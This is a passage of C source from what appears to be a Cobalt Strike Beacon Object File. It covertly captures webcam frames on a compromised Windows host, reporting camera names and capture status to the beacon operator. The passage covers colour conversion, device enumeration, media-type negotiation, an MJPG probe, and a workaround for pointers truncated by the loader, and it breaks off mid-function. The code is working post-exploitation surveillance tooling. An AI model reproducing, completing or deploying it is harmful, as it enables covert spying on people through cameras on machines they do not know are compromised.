            lpDibLine1[4] = b; lpDibLine1[5] = g; lpDibLine1[6] = r; lpDibLine1[7] = 0;
            c = y2 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine2[0] = b; lpDibLine2[1] = g; lpDibLine2[2] = r; lpDibLine2[3] = 0;
            c = y3 - 16;
            r = (BYTE)((298 * c + 409 * e + 128) >> 8);
            g = (BYTE)((298 * c - 100 * d - 208 * e + 128) >> 8);
            b = (BYTE)((298 * c + 516 * d + 128) >> 8);
            lpDibLine2[4] = b; lpDibLine2[5] = g; lpDibLine2[6] = r; lpDibLine2[7] = 0;
            lpLineY1 += 2; lpLineY2 += 2; lpLineCr += 2; lpLineCb += 2;
            lpDibLine1 += 8; lpDibLine2 += 8;
        }
        pDst += (2 * dstStride);
        lpBitsY += (2 * srcStride);
        lpBitsCr += srcStride;
        lpBitsCb += srcStride;
    }
}

static const ConversionFunction s_FormatConversions[] = {
    { s_MFVideoFormat_RGB32, TransformImage_RGB32 },
    { s_MFVideoFormat_RGB24, TransformImage_RGB24 },
    { s_MFVideoFormat_YUY2,  TransformImage_YUY2  },
    { s_MFVideoFormat_NV12,  TransformImage_NV12  }
};

// Hacky function to fix a truncated pointer assuming it is a 32-bit offset from the module base.
/*
If anyone sees this, you may ask yourself: 

What the hell is this function for?

When running this BOF in COFFLoader, all would work well.

[DEBUG] Conversion function: 00007ff49c300061, width: 1920, height: 1080

However, when running in Cobalt Strike,

[+] received output:
[DEBUG] Conversion function: 0000000000000061, width: 1920, height: 1080

for whatever reason, the front bytes of the address get truncated. Why? God knows. Honestly im not even sure
if he knows. Maybe he does. I hope he does.

Anyways, last 4 bytes are clean. Great! I'll just resolve the address of go() and pull the module base from there, then
combine it with the last 4 bytes to get the CORRECT address!

Yes. This worked. Should anyone else ever do this again? I hope not.

Whatever it works.

~ CodeX

*/
IMAGE_TRANSFORM_FN FixTruncatedXform(IMAGE_TRANSFORM_FN truncated)
{
    // Use the address of go as our reference for a good high-order part.
    uintptr_t goodHigh = ((uintptr_t)go) & 0xFFFFFFFFFFFF0000ull;
    uintptr_t low = ((uintptr_t)truncated) & 0xFFFFull;
    uintptr_t fixed = goodHigh | low;
    
    // BeaconPrintf(CALLBACK_OUTPUT,
    //     "\n[DEBUG] FixTruncatedXform: goodHigh = 0x%Ix, low = 0x%Ix, fixed pointer = %p\n",
    //     goodHigh, low, (void*)fixed);
    
    return (IMAGE_TRANSFORM_FN)fixed;
}

HRESULT CColorConverter_SetConversionFunction(CColorConverter* cc, const GUID* subtype) {
    if (!cc || !subtype) {
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] Null pointer passed to CColorConverter_SetConversionFunction.");
        return E_POINTER;
    }

    cc->m_convertFn = NULL;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting conversion function for subtype: {%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}",subtype->Data1, subtype->Data2, subtype->Data3,subtype->Data4[0], subtype->Data4[1], subtype->Data4[2], subtype->Data4[3],subtype->Data4[4], subtype->Data4[5], subtype->Data4[6], subtype->Data4[7]);

    DWORD i;
    for (i = 0; i < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0])); i++) {
        // //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Checking against format: {%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x}",
        //     s_FormatConversions[i].subtype.Data1, s_FormatConversions[i].subtype.Data2, s_FormatConversions[i].subtype.Data3,
        //     s_FormatConversions[i].subtype.Data4[0], s_FormatConversions[i].subtype.Data4[1], s_FormatConversions[i].subtype.Data4[2], s_FormatConversions[i].subtype.Data4[3],
        //     s_FormatConversions[i].subtype.Data4[4], s_FormatConversions[i].subtype.Data4[5], s_FormatConversions[i].subtype.Data4[6], s_FormatConversions[i].subtype.Data4[7]);

        if (IsEqualGUID(&s_FormatConversions[i].subtype, subtype)) {
            cc->m_convertFn = s_FormatConversions[i].xform;
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Raw conversion function pointer: %p\n", cc->m_convertFn);
            cc->m_convertFn = FixTruncatedXform(cc->m_convertFn);
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function fixed to: %p\n", cc->m_convertFn);
            return S_OK;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] No matching format found for the given subtype.");
    return MF_E_INVALIDMEDIATYPE;
}

void CColorConverter_ConvertImageToRGB32(
    CColorConverter* cc,
    BYTE* pDest,
    LONG destStride,
    IMFMediaBuffer* buf
)
{
    // 1. Validate parameters
    if (!cc || !pDest || !buf) {
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] Invalid parameters: cc=%p, pDest=%p, buf=%p\n", cc, pDest, buf);
        return;
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Entering CColorConverter_ConvertImageToRGB32\n");
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Parameters - cc: %p, pDest: %p, destStride: %d, buf: %p\n", cc, pDest, destStride, buf);

    BYTE* pbScanline0 = NULL;
    LONG lStride = 0;

    // 2. Initialize the VideoBufferLock helper
    VideoBufferLock vb;
    VideoBufferLock_Init(&vb, buf);
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] VideoBufferLock initialized\n");

    // 3. Attempt to lock the buffer
    HRESULT hr = VideoBufferLock_LockBuffer(
        &vb,
        cc->m_lDefaultStride,
        cc->m_height,
        &pbScanline0,
        &lStride
    );

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] LockBuffer returned hr: 0x%08X, pbScanline0: %p, lStride: %d\n", hr, pbScanline0, lStride);

    // 4. If lock succeeded, and we got a valid pointer, call the conversion function
    if (SUCCEEDED(hr) && pbScanline0 != NULL)
    {
        if (cc->m_convertFn) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calling conversion function\n");
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function: %p, width: %d, height: %d\n", cc->m_convertFn, cc->m_width, cc->m_height);
            
            // Convert from the webcam’s native format to RGB32
            cc->m_convertFn(
                pDest,
                destStride,
                pbScanline0,
                lStride,
                cc->m_width,
                cc->m_height
            );

            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Image conversion to RGB32 complete\n");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] No conversion function set!\n");
        }
    } else {
        // Locking the buffer failed or returned a NULL pointer
        BeaconPrintf(CALLBACK_OUTPUT, "[ERROR] LockBuffer failed: hr=0x%08X, pbScanline0=%p\n", hr, pbScanline0);
    }

    // 5. Always clean up (unlock) the buffer
    VideoBufferLock_Cleanup(&vb);
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] VideoBufferLock cleanup complete, exiting function\n");
}


int CColorConverter_IsFormatSupported(CColorConverter* cc, const GUID* subtype) {
    DWORD i;
    for (i = 0; i < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0])); i++) {
        if (IsEqualGUID(&s_FormatConversions[i].subtype, subtype))
            return 1;
    }
    return 0;
}

HRESULT CColorConverter_GetFormat(CColorConverter* cc, DWORD index, GUID* pSubtype) {
    if (index < (DWORD)(sizeof(s_FormatConversions) / sizeof(s_FormatConversions[0]))) {
        *pSubtype = s_FormatConversions[index].subtype;
        return S_OK;
    }
    return MF_E_NO_MORE_TYPES;
}

HRESULT CColorConverter_GetDefaultStride(CColorConverter* cc, IMFMediaType* pType, LONG* plStride) {
    LONG lStride = 0;
    HRESULT hr = S_OK;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_GetDefaultStride() called");

    // Attempt to get the default stride directly
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving default stride (MF_MT_DEFAULT_STRIDE)");
    hr = pType->lpVtbl->GetUINT32(pType, &MF_MT_DEFAULT_STRIDE, (UINT32*)&lStride);
    if (FAILED(hr)) {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride not set, calculating manually");

        GUID subtype = {0};
        UINT32 width = 0, height = 0;

        // Get video subtype
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving video subtype (MF_MT_SUBTYPE)");
        hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get video subtype (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video subtype retrieved successfully");

        // Get frame size
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving frame size (MF_MT_FRAME_SIZE)");
        hr = MFGetAttributeSize((IMFAttributes*)pType, &MF_MT_FRAME_SIZE, &width, &height);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get frame size (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Frame size retrieved: width=%u, height=%u", width, height);

        // Get stride for the given format
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calculating stride for format");
        hr = pMFGetStrideForBitmapInfoHeader(&subtype, width, &lStride);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to get stride for format (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Calculated stride: %ld", lStride);

        // Store the calculated stride in the media type
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Storing calculated stride in media type");
        hr = pType->lpVtbl->SetUINT32(pType, &MF_MT_DEFAULT_STRIDE, (UINT32)lStride);
        if (FAILED(hr)) {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[ERROR] Failed to set default stride (HRESULT: 0x%08X)", hr);
            return hr;
        }
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride stored successfully");
    } else {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride retrieved successfully: %ld", lStride);
    }

    *plStride = lStride;
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_GetDefaultStride() completed with HRESULT: 0x%08X", hr);
    return hr;
}



HRESULT CColorConverter_SetVideoType(CColorConverter* cc, IMFMediaType* pType)
{
    HRESULT hr = S_OK;
    GUID subtype = {0};
    UINT32 num = 0, den = 0;
    UINT32 interlace = 0;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_SetVideoType() called");

    // Get the video subtype.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving video subtype (MF_MT_SUBTYPE)");
    hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get MF_MT_SUBTYPE (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Video subtype retrieved successfully");

    // Choose a conversion function.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting conversion function for subtype");
    hr = CColorConverter_SetConversionFunction(cc, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set conversion function (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Conversion function set successfully");

    // Get the frame size.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving frame size (MF_MT_FRAME_SIZE)");
    hr = MFGetAttributeSize((IMFAttributes*)pType, &MF_MT_FRAME_SIZE, &cc->m_width, &cc->m_height);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get frame size (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Frame size retrieved: width=%u, height=%u", cc->m_width, cc->m_height);

    // Get the interlace mode; default is progressive.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving interlace mode (MF_MT_INTERLACE_MODE)");
    hr = MFGetAttributeUINT32((IMFAttributes*)pType, &MF_MT_INTERLACE_MODE, &interlace);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get interlace mode (HRESULT: 0x%08X). Defaulting to MFVideoInterlace_Progressive", hr);
        cc->m_interlace = MFVideoInterlace_Progressive;
    }
    else
    {
        cc->m_interlace = (MFVideoInterlaceMode)interlace;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Interlace mode set to %u", cc->m_interlace);

    // Get the default stride.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting default stride");
    hr = CColorConverter_GetDefaultStride(cc, pType, &cc->m_lDefaultStride);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get default stride (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Default stride: %ld", cc->m_lDefaultStride);

    // Get the pixel aspect ratio. Default to 1:1 if not available.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieving pixel aspect ratio (MF_MT_PIXEL_ASPECT_RATIO)");
    hr = MFGetAttributeRatio((IMFAttributes*)pType, &MF_MT_PIXEL_ASPECT_RATIO, &num, &den);
    if (SUCCEEDED(hr))
    {
        cc->m_PixelAR.Numerator = num;
        cc->m_PixelAR.Denominator = den;
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Pixel aspect ratio retrieved: %u:%u", num, den);
    }
    else
    {
        cc->m_PixelAR.Numerator = cc->m_PixelAR.Denominator = 1;
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get pixel aspect ratio (HRESULT: 0x%08X). Defaulting to 1:1", hr);
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CColorConverter_SetVideoType() completed with HRESULT: 0x%08X", hr);
    return hr;
}


/* WebcamAccess */
typedef struct _ChooseDeviceParam {
    IMFActivate** ppDevices;
    UINT32 count;
    UINT32 selection;
} ChooseDeviceParam;

typedef struct _CWebcamAccess {
    ChooseDeviceParam m_cam_devices;
    IMFSourceReader* m_pReader;
    CColorConverter m_color_converter;
    BOOL m_ready;
    BOOL m_mjpg;
    UINT32 m_w;
    UINT32 m_h;
} CWebcamAccess;

void CWebcamAccess_Init(CWebcamAccess* wa) {
    ZeroMemory(&wa->m_cam_devices, sizeof(wa->m_cam_devices));
    wa->m_pReader = NULL;
    CColorConverter_Init(&wa->m_color_converter);
    wa->m_ready = FALSE;
    wa->m_mjpg = FALSE;
    wa->m_w = 0;
    wa->m_h = 0;
}

void CWebcamAccess_CloseDevice(CWebcamAccess* wa) {
    if (wa->m_pReader)
        SAFE_RELEASE(wa->m_pReader);
    wa->m_ready = FALSE;
    wa->m_mjpg = FALSE;
}

void CWebcamAccess_Destroy(CWebcamAccess* wa) {
    CWebcamAccess_CloseDevice(wa);
    for (DWORD i = 0; i < wa->m_cam_devices.count; i++) {
        SAFE_RELEASE(wa->m_cam_devices.ppDevices[i]);
    }
    pCoTaskMemFree(wa->m_cam_devices.ppDevices);
}

HRESULT CWebcamAccess_BuildListOfDevices(CWebcamAccess* wa)
{
    HRESULT hr = S_OK;

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_BuildListOfDevices() called");

    // Zero out the device list structure.
    ZeroMemory(&wa->m_cam_devices, sizeof(wa->m_cam_devices));
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Zeroed m_cam_devices structure");

    IMFAttributes* pAttributes = NULL;

    // Use the function pointer to create the attribute store.
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Creating attribute store with pMFCreateAttributes");
    hr = pMFCreateAttributes(&pAttributes, 1);
    if (SUCCEEDED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Attribute store created successfully");

        // Set the attribute to specify that we want video capture devices.
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting attribute MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE");
        hr = pAttributes->lpVtbl->SetGUID(
            pAttributes,
            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE,
            &MF_DEVSOURCE_ATTRIBUTE_SOURCE_TYPE_VIDCAP_GUID
        );

        if (SUCCEEDED(hr))
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Attribute set successfully");

            // Enumerate the video capture devices.
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Enumerating video capture devices with pMFEnumDeviceSources");
            hr = pMFEnumDeviceSources(pAttributes,
                                      &wa->m_cam_devices.ppDevices,
                                      &wa->m_cam_devices.count);
            if (SUCCEEDED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully enumerated %u video capture devices", wa->m_cam_devices.count);

                // Iterate through each device and print its friendly name.
                for (UINT i = 0; i < wa->m_cam_devices.count; i++)
                {
                    WCHAR* szFriendlyName = NULL;
                    UINT32 cchName = 0;
                    HRESULT hrName = wa->m_cam_devices.ppDevices[i]->lpVtbl->GetAllocatedString(
                        wa->m_cam_devices.ppDevices[i],
                        &MF_DEVSOURCE_ATTRIBUTE_FRIENDLY_NAME,
                        &szFriendlyName,
                        &cchName
                    );
                    if (SUCCEEDED(hrName))
                    {
                        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Using device %u: %ls", i, szFriendlyName);
                        pCoTaskMemFree(szFriendlyName);
                    }
                    else
                    {
                        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to retrieve friendly name for device %u (HRESULT: 0x%08X)", i, hrName);
                    }
                }
            }
            else
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to enumerate video capture devices (HRESULT: 0x%08X)", hr);
            }
        }
        else
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set attribute (HRESULT: 0x%08X)", hr);
        }
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to create attribute store (HRESULT: 0x%08X)", hr);
    }

    // Release the attribute store.
    if (pAttributes)
    {
        pAttributes->lpVtbl->Release(pAttributes);
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Released attribute store");
    }

    return hr;
}


HRESULT CWebcamAccess_Initialize(CWebcamAccess* wa)
{
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_Initialize() called");

    HRESULT hr = CWebcamAccess_BuildListOfDevices(wa);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] Failed to build list of webcam devices (HRESULT: 0x%08X)",hr);
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully built list of webcam devices");
    }

    //BeaconPrintf(CALLBACK_OUTPUT,"\n[DEBUG] CWebcamAccess_Initialize() completed with HRESULT: 0x%08X",hr);
    return hr;
}


int CWebcamAccess_SetDeviceIndex(CWebcamAccess* wa, unsigned int index) {
    if (index < wa->m_cam_devices.count) {
        wa->m_cam_devices.selection = index;
        return 1;
    }
    return 0;
}

HRESULT CWebcamAccess_TryMediaType(CWebcamAccess* wa, IMFMediaType* pType)
{
    HRESULT hr = S_OK;
    BOOL bFound = FALSE;
    GUID subtype = {0};

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_TryMediaType() called");

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting GUID for MF_MT_SUBTYPE");
    hr = pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &subtype);
    if (FAILED(hr))
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to get MF_MT_SUBTYPE (HRESULT: 0x%08X)", hr);
        return hr;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Retrieved subtype GUID");

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Checking if color converter supports format directly");
    if (CColorConverter_IsFormatSupported(&wa->m_color_converter, &subtype))
    {
        hr = wa->m_pReader->lpVtbl->SetCurrentMediaType(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
        if (SUCCEEDED(hr))
            bFound = TRUE;
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Direct format not supported, attempting conversion formats");
        DWORD i = 0;
        for (;; i++)
        {
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Getting conversion format at index %u", i);
            hr = CColorConverter_GetFormat(&wa->m_color_converter, i, &subtype);
            if (FAILED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] No more conversion formats available or error occurred at index %u (HRESULT: 0x%08X)", i, hr);
                break;
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting MF_MT_SUBTYPE with conversion format at index %u", i);
            hr = pType->lpVtbl->SetGUID(pType, &MF_MT_SUBTYPE, &subtype);
            if (FAILED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Failed to set MF_MT_SUBTYPE for conversion format index %u (HRESULT: 0x%08X)", i, hr);
                break;
            }
            //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Setting current media type on source reader with conversion format at index %u", i);
            hr = wa->m_pReader->lpVtbl->SetCurrentMediaType(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
            if (SUCCEEDED(hr))
            {
                //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Successfully set current media type with conversion format at index %u", i);
                bFound = TRUE;
                break;
            }
        }
    }

    if (bFound)
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] Suitable media type found, updating video type in color converter");
        hr = CColorConverter_SetVideoType(&wa->m_color_converter, pType);
    }
    else
    {
        //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] No suitable media type found");
    }

    //BeaconPrintf(CALLBACK_OUTPUT, "\n[DEBUG] CWebcamAccess_TryMediaType() completed with HRESULT: 0x%08X", hr);
    return hr;
}


HRESULT CWebcamAccess_Probe(CWebcamAccess* wa);

HRESULT CWebcamAccess_AskRGB32(CWebcamAccess* wa, UINT32 w, UINT32 h) {
    IMFMediaType* t = NULL;
    HRESULT hr;
    if (!pMFCreateMediaType)
        return E_FAIL;
    hr = pMFCreateMediaType(&t);
    if (FAILED(hr) || !t)
        return hr;
    t->lpVtbl->SetGUID(t, &MF_MT_MAJOR_TYPE, &MFMediaType_Video);
    t->lpVtbl->SetGUID(t, &MF_MT_SUBTYPE, &s_MFVideoFormat_RGB32);
    t->lpVtbl->SetUINT64(t, &MF_MT_FRAME_SIZE, ((UINT64)w << 32) | (UINT64)h);
    t->lpVtbl->SetUINT32(t, &MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
    t->lpVtbl->SetUINT32(t, &MF_MT_DEFAULT_STRIDE, w * 4);
    hr = wa->m_pReader->lpVtbl->SetCurrentMediaType(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, t);
    if (SUCCEEDED(hr))
        hr = CColorConverter_SetVideoType(&wa->m_color_converter, t);
    SAFE_RELEASE(t);
    return hr;
}

HRESULT CWebcamAccess_AskRGB32From(CWebcamAccess* wa, IMFMediaType* native) {
    IMFMediaType* t = NULL;
    HRESULT hr;
    UINT32 w = 0, h = 0;
    UINT64 fr = 0;
    if (!pMFCreateMediaType || !native)
        return E_FAIL;
    MFGetAttributeSize((IMFAttributes *)native, &MF_MT_FRAME_SIZE, &w, &h);
    native->lpVtbl->GetUINT64(native, &MF_MT_FRAME_RATE, &fr);
    hr = pMFCreateMediaType(&t);
    if (FAILED(hr) || !t)
        return hr;
    /* Clean RGB32 type — CopyAllItems from MJPG leaves compressed extras and 0xc00d36e6. */
    t->lpVtbl->SetGUID(t, &MF_MT_MAJOR_TYPE, &MFMediaType_Video);
    t->lpVtbl->SetGUID(t, &MF_MT_SUBTYPE, &s_MFVideoFormat_RGB32);
    if (w && h)
        t->lpVtbl->SetUINT64(t, &MF_MT_FRAME_SIZE, ((UINT64)w << 32) | (UINT64)h);
    if (fr)
        t->lpVtbl->SetUINT64(t, &MF_MT_FRAME_RATE, fr);
    t->lpVtbl->SetUINT32(t, &MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
    if (w)
        t->lpVtbl->SetUINT32(t, &MF_MT_DEFAULT_STRIDE, w * 4);
    t->lpVtbl->SetUINT32(t, &MF_MT_FIXED_SIZE_SAMPLES, TRUE);
    t->lpVtbl->SetUINT32(t, &MF_MT_ALL_SAMPLES_INDEPENDENT, TRUE);
    if (w && h)
        t->lpVtbl->SetUINT32(t, &MF_MT_SAMPLE_SIZE, w * h * 4);
    hr = wa->m_pReader->lpVtbl->SetCurrentMediaType(wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, t);
    if (SUCCEEDED(hr))
        hr = CColorConverter_SetVideoType(&wa->m_color_converter, t);
    SAFE_RELEASE(t);
    return hr;
}

static int ascii_has(const char* s, const char* n) {
    int i, j;
    if (!s || !n) return 0;
    for (i = 0; s[i]; i++) {
        for (j = 0; n[j]; j++) {
            char a = s[i + j], b = n[j];
            if (a >= 'A' && a <= 'Z') a = (char)(a - 'A' + 'a');
            if (b >= 'A' && b <= 'Z') b = (char)(b - 'A' + 'a');
            if (!a || a != b) break;
        }
        if (!n[j]) return 1;
    }
    return 0;
}

HRESULT CWebcamAccess_OpenReader(CWebcamAccess* wa, IMFMediaSource* pSource) {
    IMFAttributes* pAttributes = NULL;
    HRESULT hr;
    CWebcamAccess_CloseDevice(wa);
    hr = pMFCreateAttributes(&pAttributes, 4);
    if (FAILED(hr))
        return hr;
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_READWRITE_DISABLE_CONVERTERS, TRUE);
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, FALSE);
    pAttributes->lpVtbl->SetUINT32(pAttributes, &s_MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, FALSE);
    hr = pMFCreateSourceReaderFromMediaSource(pSource, pAttributes, &wa->m_pReader);
    SAFE_RELEASE(pAttributes);
    return hr;
}

HRESULT CWebcamAccess_TryNativeMjpg(CWebcamAccess* wa) {
    IMFMediaType* pType = NULL;
    HRESULT chosen = E_FAIL;
    HRESULT hr, hrAsk, hrProbe;
    DWORD i;
    int pass;
    if (!wa->m_pReader)
        return E_FAIL;
    for (pass = 0; pass < 3 && FAILED(chosen); pass++) {
        for (i = 0;; i++) {
            UINT32 tw = 0, th = 0;
            GUID sub = {0};
            DWORD fcc;
            hr = wa->m_pReader->lpVtbl->GetNativeMediaType(wa->m_pReader,
                                                           (DWORD)MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                                                           i, &pType);
            if (FAILED(hr))
                break;
            MFGetAttributeSize((IMFAttributes *)pType, &MF_MT_FRAME_SIZE, &tw, &th);
            pType->lpVtbl->GetGUID(pType, &MF_MT_SUBTYPE, &sub);
            fcc = sub.Data1;
            if (pass == 0 && i < 12) {
                BeaconPrintf(CALLBACK_OUTPUT, "[*] native idx=%u %ux%u %c%c%c%c",
                             i, tw, th,
                             (char)fcc, (char)(fcc >> 8),
                             (char)(fcc >> 16), (char)(fcc >> 24));
            }
            if (fcc != 0x47504A4D) {
                SAFE_RELEASE(pType);
                continue;
            }
            if (pass == 0 && !(tw == 1920 && th == 1080)) {
                SAFE_RELEASE(pType);
                continue;
            }
            if (pass == 1 && !(tw == 1280 && th == 720)) {
                SAFE_RELEASE(pType);
                continue;
            }
            hrAsk = wa->m_pReader->lpVtbl->SetCurrentMediaType(
                wa->m_pReader, MF_SOURCE_READER_FIRST_VIDEO_STREAM, NULL, pType);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] native MJPG set %ux%u idx=%u hr=0x%08lx",
                         tw, th, i, hrAsk);
            SAFE_RELEASE(pType);
            if (FAILED(hrAsk))
                continue;
            hrProbe = CWebcamAccess_Probe(wa);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] native MJPG probe 0x%08lx", hrProbe);
            if (SUCCEEDED(hrProbe)) {
                wa->m_mjpg = TRUE;
                wa->m_w = tw;
                wa->m_h = th;
                wa->m_ready = TRUE;
                return S_OK;
            }
            if (hrProbe == 0xc00d3704L) {
                /* source/pin dead — caller recreates */
                return hrProbe;
            }
        }
    }
    return chosen;
}

HRESULT CWebcamAccess_PrepareFromSource(CWebcamAccess* wa, IMFMediaSource* pSource) {
    HRESULT hr = CWebcamAccess_OpenReader(wa, pSource);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] OpenReader 0x%08lx", hr);
        return hr;
    }
    hr = CWebcamAccess_TryNativeMjpg(wa);
    if (FAILED(hr)) {
